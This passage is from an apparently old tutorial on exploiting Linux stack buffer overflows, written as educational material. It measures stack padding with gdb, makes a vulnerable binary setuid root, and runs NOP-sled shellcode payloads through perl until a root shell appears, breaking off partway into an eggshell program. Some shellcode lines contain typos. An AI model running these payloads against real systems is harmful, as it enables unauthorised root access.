-------------<br/><br/><br/>The&nbsp;following&nbsp;shows&nbsp;the&nbsp;size&nbsp;of&nbsp;n&nbsp;in&nbsp;the&nbsp;"buffer[n]"&nbsp;and&nbsp;real&nbsp;memory&nbsp;size.&nbsp;<br/><br/><br/>---------------------------------------------<br/>size&nbsp;of&nbsp;n&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;real&nbsp;memory&nbsp;size&nbsp;&nbsp;<br/>---------------------------------------------<br/>1&nbsp;-&nbsp;16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24&nbsp;bytes<br/>---------------------------------------------<br/>17&nbsp;-&nbsp;32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;40&nbsp;bytes<br/>---------------------------------------------<br/>33&nbsp;-&nbsp;48&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;56&nbsp;bytes<br/>---------------------------------------------<br/>49&nbsp;-&nbsp;64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;72&nbsp;bytes<br/>---------------------------------------------<br/>65&nbsp;-&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;88&nbsp;bytes<br/>---------------------------------------------<br/>81&nbsp;-&nbsp;96&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;104&nbsp;bytes<br/>---------------------------------------------<br/>97&nbsp;-112&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;120&nbsp;bytes<br/>:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:<br/>---------------------------------------------<br/><br/>As&nbsp;we&nbsp;can&nbsp;see,&nbsp;there&nbsp;is&nbsp;a&nbsp;change&nbsp;in&nbsp;the&nbsp;real&nbsp;memory&nbsp;size&nbsp;when&nbsp;16&nbsp;bytes&nbsp;are<br/>added&nbsp;to&nbsp;n.&nbsp;<br/><br/>16+16(=32)+16(=48)+16(=64)+16(=80)+16(=96)+16(=112).......<br/>24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;72&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;88&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;120<br/>&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;&nbsp;+&nbsp;&nbsp;16&nbsp;&nbsp;+&nbsp;&nbsp;&nbsp;16&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp;16&nbsp;&nbsp;+&nbsp;&nbsp;16&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp;&nbsp;16.......<br/><br/>But&nbsp;in&nbsp;my&nbsp;system&nbsp;there&nbsp;are&nbsp;some&nbsp;irregularity&nbsp;when&nbsp;n&nbsp;is&nbsp;between&nbsp;1&nbsp;and&nbsp;16.<br/>When&nbsp;n&nbsp;is&nbsp;1,&nbsp;2,&nbsp;4,&nbsp;8,&nbsp;the&nbsp;real&nbsp;size&nbsp;of&nbsp;memory&nbsp;is&nbsp;8&nbsp;bytes.&nbsp;Let's&nbsp;have<br/>another&nbsp;example.<br/><br/>----------------------------------------------------<br/>int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buffer[10];<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(buffer,&nbsp;argv[1]);<br/>}<br/>----------------------------------------------------<br/><br/>In&nbsp;the&nbsp;case&nbsp;of&nbsp;below&nbsp;gcc&nbsp;2.96,&nbsp;we&nbsp;will&nbsp;get&nbsp;a&nbsp;result&nbsp;as&nbsp;following:<br/><br/>&nbsp;&nbsp;buffer(12)&nbsp;-&nbsp;sfp(4)&nbsp;-&nbsp;ret(4)<br/><br/>But&nbsp;after&nbsp;gcc&nbsp;2.96,&nbsp;we&nbsp;will&nbsp;get&nbsp;the&nbsp;result&nbsp;like&nbsp;following:&nbsp;<br/><br/>&nbsp;&nbsp;buffer(16)&nbsp;-&nbsp;dummy(8)&nbsp;-&nbsp;sfp(4)&nbsp;-&nbsp;ret(4).&nbsp;<br/><br/>We&nbsp;can&nbsp;see&nbsp;that&nbsp;there&nbsp;are&nbsp;8&nbsp;bytes&nbsp;dummy.&nbsp;Let's&nbsp;check&nbsp;by&nbsp;using&nbsp;gdb.<br/><br/><br/>[vangelis@heezin&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul2<br/>(gdb)&nbsp;disas&nbsp;main<br/>Dump&nbsp;of&nbsp;assembler&nbsp;code&nbsp;for&nbsp;function&nbsp;main:<br/>0x8048328&nbsp;&lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>0x8048329&nbsp;&lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp<br/>0x804832b&nbsp;&lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x18,%esp<br/>0x804832e&nbsp;&lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;$0xfffffff0,%esp<br/>0x8048331&nbsp;&lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048336&nbsp;&lt;main+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;%eax,%esp<br/>0x8048338&nbsp;&lt;main+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x8,%esp<br/>0x804833b&nbsp;&lt;main+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xc(%ebp),%eax<br/>0x804833e&nbsp;&lt;main+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x4,%eax<br/>0x8048341&nbsp;&lt;main+25&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;(%eax)<br/>0x8048343&nbsp;&lt;main+27&gt;:&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;0xffffffe8(%ebp),%eax<br/>0x8048346&nbsp;&lt;main+30&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%eax<br/>0x8048347&nbsp;&lt;main+31&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x8048268&nbsp;&lt;strcpy&gt;<br/>0x804834c&nbsp;&lt;main+36&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x10,%esp<br/>0x804834f&nbsp;&lt;main+39&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048354&nbsp;&lt;main+44&gt;:&nbsp;&nbsp;&nbsp;&nbsp;leave&nbsp;&nbsp;<br/>0x8048355&nbsp;&lt;main+45&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x8048356&nbsp;&lt;main+46&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x8048357&nbsp;&lt;main+47&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop&nbsp;&nbsp;&nbsp;&nbsp;<br/>End&nbsp;of&nbsp;assembler&nbsp;dump.<br/>(gdb)<br/><br/>Let's&nbsp;go&nbsp;back&nbsp;to&nbsp;the&nbsp;vul.c.&nbsp;When&nbsp;we&nbsp;put&nbsp;124&nbsp;"A"&nbsp;into&nbsp;buffer,&nbsp;we&nbsp;got&nbsp;<br/>'Segmentation&nbsp;fault.'&nbsp;<br/><br/>Let's&nbsp;check&nbsp;by&nbsp;using&nbsp;gdb.<br/><br/>[root@localhost&nbsp;bof]#&nbsp;gdb&nbsp;-q&nbsp;vul<br/>(gdb)&nbsp;disas&nbsp;main<br/>Dump&nbsp;of&nbsp;assembler&nbsp;code&nbsp;for&nbsp;function&nbsp;main:<br/>0x8048328&nbsp;&lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>0x8048329&nbsp;&lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp<br/>0x804832b&nbsp;&lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x78,%esp&nbsp;&nbsp;<br/>0x804832e&nbsp;&lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;$0xfffffff0,%esp<br/>0x8048331&nbsp;&lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048336&nbsp;&lt;main+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;%eax,%esp<br/>0x8048338&nbsp;&lt;main+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x8,%esp<br/>0x804833b&nbsp;&lt;main+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xc(%ebp),%eax<br/>0x804833e&nbsp;&lt;main+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x4,%eax<br/>0x8048341&nbsp;&lt;main+25&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;(%eax)<br/>0x8048343&nbsp;&lt;main+27&gt;:&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;0xffffff88(%ebp),%eax<br/>0x8048346&nbsp;&lt;main+30&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%eax<br/>0x8048347&nbsp;&lt;main+31&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x8048268&nbsp;&lt;strcpy&gt;<br/>0x804834c&nbsp;&lt;main+36&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x10,%esp<br/>0x804834f&nbsp;&lt;main+39&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048354&nbsp;&lt;main+44&gt;:&nbsp;&nbsp;&nbsp;&nbsp;leave&nbsp;&nbsp;<br/>0x8048355&nbsp;&lt;main+45&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x8048356&nbsp;&lt;main+46&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x8048357&nbsp;&lt;main+47&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop&nbsp;&nbsp;&nbsp;&nbsp;<br/>End&nbsp;of&nbsp;assembler&nbsp;dump.<br/>(gdb)<br/><br/>As&nbsp;you&nbsp;can&nbsp;see,&nbsp;120&nbsp;bytes&nbsp;are&nbsp;allocated&nbsp;for&nbsp;the&nbsp;local&nbsp;variable.&nbsp;So,&nbsp;in&nbsp;<br/>order&nbsp;to&nbsp;overflow&nbsp;the&nbsp;stack,&nbsp;we&nbsp;must&nbsp;put&nbsp;more&nbsp;than&nbsp;124&nbsp;bytes'&nbsp;data.&nbsp;Remember<br/>that&nbsp;you&nbsp;have&nbsp;to&nbsp;check&nbsp;how&nbsp;many&nbsp;data&nbsp;are&nbsp;allocated&nbsp;for&nbsp;local&nbsp;variables&nbsp;when<br/>you&nbsp;exploit&nbsp;a&nbsp;vulnerable&nbsp;program.&nbsp;<br/><br/>The&nbsp;last&nbsp;thing&nbsp;to&nbsp;do&nbsp;is&nbsp;to&nbsp;change&nbsp;the&nbsp;owner&nbsp;and&nbsp;permission&nbsp;of&nbsp;the&nbsp;vulnerable<br/>program.&nbsp;I&nbsp;make&nbsp;a&nbsp;simple&nbsp;program&nbsp;chogm.c&nbsp;to&nbsp;do&nbsp;it.&nbsp;&nbsp;<br/><br/>[root@localhost&nbsp;bof]#&nbsp;cat&nbsp;&gt;&nbsp;chogm.c<br/>#include&nbsp;&lt;unistd.h&gt;<br/>#include&nbsp;&lt;stdio.h&gt;<br/>#include&nbsp;&lt;sys/types.h&gt;<br/>#include&nbsp;&lt;sys/stat.h&gt;<br/><br/>int&nbsp;main()<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;file_name[20];<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Put&nbsp;the&nbsp;file&nbsp;name&nbsp;you&nbsp;want&nbsp;to&nbsp;chown&nbsp;and&nbsp;chmod:&nbsp;");<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;scanf("%s",file_name);<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chown(file_name,0,0);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod(file_name,04755);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br/>}<br/><br/>[root@localhost&nbsp;bof]#&nbsp;gcc&nbsp;-o&nbsp;chogm&nbsp;chogm.c<br/>[root@localhost&nbsp;bof]#&nbsp;./chogm<br/>Put&nbsp;the&nbsp;file&nbsp;name&nbsp;you&nbsp;want&nbsp;to&nbsp;chown&nbsp;and&nbsp;chmod:&nbsp;vul<br/>[root@localhost&nbsp;bof]#&nbsp;ls&nbsp;-l&nbsp;vul<br/>-rwsr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11352&nbsp;10&amp;#50900;&nbsp;5&nbsp;10:04&nbsp;vul<br/>[root@localhost&nbsp;bof]#<br/><br/>Now,&nbsp;it's&nbsp;time&nbsp;to&nbsp;attack.&nbsp;I&nbsp;will&nbsp;suggest&nbsp;some&nbsp;techniques&nbsp;to&nbsp;exploit&nbsp;the&nbsp;<br/>vulnerable&nbsp;program.&nbsp;At&nbsp;first,&nbsp;I&nbsp;will&nbsp;suggest&nbsp;two&nbsp;classical&nbsp;ways.&nbsp;And&nbsp;then&nbsp;I&nbsp;will<br/>suggest&nbsp;more&nbsp;advanced&nbsp;ways&nbsp;which&nbsp;can&nbsp;be&nbsp;used&nbsp;under&nbsp;non-executable&nbsp;stack.&nbsp;<br/><br/><br/><br/>2.&nbsp;Classical&nbsp;Overflow&nbsp;Technique<br/><br/>&nbsp;&nbsp;The&nbsp;classical&nbsp;overflow&nbsp;technique&nbsp;uses&nbsp;the&nbsp;concept&nbsp;of&nbsp;overwriting&nbsp;the&nbsp;EIP&nbsp;<br/>register&nbsp;with&nbsp;approximate&nbsp;address&nbsp;of&nbsp;many&nbsp;NOPs&nbsp;in&nbsp;memory&nbsp;or&nbsp;shellcode.&nbsp;We&nbsp;have&nbsp;to<br/>guess&nbsp;and&nbsp;estimate&nbsp;the&nbsp;return&nbsp;address.&nbsp;If&nbsp;you&nbsp;are&nbsp;not&nbsp;familiar&nbsp;with&nbsp;the&nbsp;the&nbsp;<br/>concept&nbsp;of&nbsp;classical&nbsp;overflow&nbsp;technique,&nbsp;I&nbsp;recommend&nbsp;you&nbsp;to&nbsp;read&nbsp;the&nbsp;Aleph&nbsp;One's&nbsp;<br/>"Smashing&nbsp;The&nbsp;Stack&nbsp;For&nbsp;Fun&nbsp;And&nbsp;&nbsp;Profit"(http://phrack.org/phrack/49/P49-14)&nbsp;and&nbsp;<br/>other&nbsp;good&nbsp;articles&nbsp;which&nbsp;are&nbsp;related&nbsp;with&nbsp;this&nbsp;subject.&nbsp;<br/><br/><br/><br/>2.1.&nbsp;General&nbsp;Overflow&nbsp;Technique<br/><br/>The&nbsp;classical&nbsp;exploit&nbsp;payload&nbsp;is&nbsp;composed&nbsp;of&nbsp;the&nbsp;following.<br/><br/>----------------------------------------------<br/>|&nbsp;NOP&nbsp;|&nbsp;shellcode&nbsp;|&nbsp;(dummy)&nbsp;|&nbsp;return&nbsp;address&nbsp;|<br/>----------------------------------------------<br/><br/>I&nbsp;think&nbsp;most&nbsp;readers&nbsp;of&nbsp;this&nbsp;article&nbsp;are&nbsp;familiar&nbsp;with&nbsp;the&nbsp;classical&nbsp;way&nbsp;to&nbsp;exploit&nbsp;<br/>the&nbsp;stack-based&nbsp;overflow.&nbsp;So,&nbsp;I&nbsp;will&nbsp;not&nbsp;explain&nbsp;in&nbsp;detail.<br/><br/>[root@localhost&nbsp;bof]#&nbsp;su&nbsp;vangelis<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul<br/>(gdb)&nbsp;disas&nbsp;main<br/>Dump&nbsp;of&nbsp;assembler&nbsp;code&nbsp;for&nbsp;function&nbsp;main:<br/>0x8048328&nbsp;&lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>0x8048329&nbsp;&lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp<br/>0x804832b&nbsp;&lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x78,%esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x804832e&nbsp;&lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;$0xfffffff0,%esp&nbsp;<br/>0x8048331&nbsp;&lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048336&nbsp;&lt;main+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;%eax,%esp<br/>0x8048338&nbsp;&lt;main+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x8,%esp<br/>0x804833b&nbsp;&lt;main+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xc(%ebp),%eax<br/>0x804833e&nbsp;&lt;main+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x4,%eax<br/>0x8048341&nbsp;&lt;main+25&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;(%eax)<br/>0x8048343&nbsp;&lt;main+27&gt;:&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;0xffffff88(%ebp),%eax<br/>0x8048346&nbsp;&lt;main+30&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%eax<br/>0x8048347&nbsp;&lt;main+31&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x8048268&nbsp;&lt;strcpy&gt;<br/>0x804834c&nbsp;&lt;main+36&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x10,%esp<br/>0x804834f&nbsp;&lt;main+39&gt;:&nbsp;&nbsp;&nbsp;&nbsp;leave<br/>0x8048350&nbsp;&lt;main+40&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret<br/>0x8048351&nbsp;&lt;main+41&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop<br/>0x8048352&nbsp;&lt;main+42&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop<br/>0x8048353&nbsp;&lt;main+43&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop<br/>End&nbsp;of&nbsp;assembler&nbsp;dump.<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x804832e<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/vul<br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;permission&nbsp;denied<br/><br/>Breakpoint&nbsp;1,&nbsp;0x0804832e&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;x/x&nbsp;$ebp<br/>0xbfffef08:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xbfffef28&nbsp;&nbsp;&nbsp;//&nbsp;return&nbsp;address:&nbsp;$ebp&nbsp;+&nbsp;4:&nbsp;0xbfffef08&nbsp;+&nbsp;4&nbsp;=&nbsp;0xbfffef0c<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$<br/><br/>It&nbsp;is&nbsp;quite&nbsp;easy&nbsp;to&nbsp;get&nbsp;the&nbsp;return&nbsp;address.&nbsp;The&nbsp;general&nbsp;stack&nbsp;form&nbsp;is&nbsp;following:&nbsp;<br/><br/>&nbsp;&nbsp;buffer&nbsp;-&nbsp;(dummy)&nbsp;-&nbsp;ebp(4)&nbsp;-&nbsp;ret(4)<br/><br/>So,&nbsp;to&nbsp;get&nbsp;the&nbsp;return&nbsp;address,&nbsp;we&nbsp;get&nbsp;$ebp&nbsp;first&nbsp;and&nbsp;then&nbsp;plus&nbsp;4.&nbsp;The&nbsp;$ebp&nbsp;is&nbsp;<br/>0xbfffef08.&nbsp;We&nbsp;add&nbsp;4&nbsp;to&nbsp;0xbfffef08.&nbsp;And&nbsp;then&nbsp;we&nbsp;get&nbsp;the&nbsp;return&nbsp;address&nbsp;0xbfffef0c.<br/>However,&nbsp;we&nbsp;have&nbsp;to&nbsp;remember&nbsp;that&nbsp;the&nbsp;return&nbsp;address&nbsp;through&nbsp;using&nbsp;gdb&nbsp;may&nbsp;be&nbsp;not&nbsp;<br/>correct.&nbsp;So,&nbsp;when&nbsp;we&nbsp;attack&nbsp;the&nbsp;vulnerable&nbsp;program&nbsp;and&nbsp;if&nbsp;the&nbsp;return&nbsp;address&nbsp;is&nbsp;<br/>not&nbsp;correct,&nbsp;we&nbsp;have&nbsp;to&nbsp;add&nbsp;or&nbsp;subtract&nbsp;some&nbsp;bytes.<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\x90"x72,&nbsp;"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42x0b\xcd\x80",&nbsp;"a"x20,&nbsp;"\x0c\xef\xff\xbf"'`<br/>Segmentation&nbsp;fault<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\x90"x72,&nbsp;"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80",&nbsp;"a"x20,&nbsp;"\x0c\xf1xff\xbf"'`<br/>Segmentation&nbsp;fault<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\x90"x72,&nbsp;"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80",&nbsp;"a"x20,&nbsp;"\x0c\xf2xff\xbf"'`<br/>sh-2.05b#<br/><br/>I&nbsp;got&nbsp;a&nbsp;root&nbsp;shell.&nbsp;But&nbsp;I&nbsp;think&nbsp;this&nbsp;way&nbsp;of&nbsp;exploiting&nbsp;is&nbsp;a&nbsp;little&nbsp;silly&nbsp;one.&nbsp;<br/>Let's&nbsp;use&nbsp;another&nbsp;classical&nbsp;way,&nbsp;using&nbsp;eggshell&nbsp;program.<br/><br/><br/><br/>2.2.&nbsp;Using&nbsp;"eggshell"<br/><br/>The&nbsp;way&nbsp;we&nbsp;use&nbsp;eggshell&nbsp;is&nbsp;to&nbsp;overwrite&nbsp;the&nbsp;return&nbsp;address&nbsp;of&nbsp;a&nbsp;vulnerable&nbsp;function&nbsp;<br/>with&nbsp;the&nbsp;address&nbsp;we&nbsp;get&nbsp;after&nbsp;we&nbsp;execute&nbsp;the&nbsp;eggshell&nbsp;program.&nbsp;We&nbsp;have&nbsp;to&nbsp;keep&nbsp;in&nbsp;<br/>mind&nbsp;that&nbsp;we&nbsp;must&nbsp;use&nbsp;a&nbsp;suitable&nbsp;setreuid&nbsp;shellcode&nbsp;to&nbsp;get&nbsp;a&nbsp;shell&nbsp;we&nbsp;want.&nbsp;If&nbsp;we&nbsp;<br/>want&nbsp;to&nbsp;get&nbsp;a&nbsp;root&nbsp;shell,&nbsp;we&nbsp;have&nbsp;to&nbsp;use&nbsp;setreuid(0.0)&nbsp;code.&nbsp;If&nbsp;you&nbsp;don't&nbsp;use&nbsp;the&nbsp;<br/>setreuid(0,0)&nbsp;code,&nbsp;you&nbsp;can't&nbsp;get&nbsp;a&nbsp;root&nbsp;shell.&nbsp;I&nbsp;will&nbsp;not&nbsp;discuss&nbsp;the&nbsp;way&nbsp;to&nbsp;make<br/>shellcodes,&nbsp;because&nbsp;there&nbsp;are&nbsp;so&nbsp;many&nbsp;good&nbsp;documents&nbsp;about&nbsp;it.&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;eggshell.c<br/>#include&nbsp;&lt;stdlib.h&gt;<br/><br/>#define&nbsp;DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0<br/>#define&nbsp;DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512<br/>#define&nbsp;DEFAULT_EGG_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2048<br/>#define&nbsp;NOP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x90<br/><br/>char&nbsp;shellcode[]&nbsp;=<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"\x31\xc0\xb0\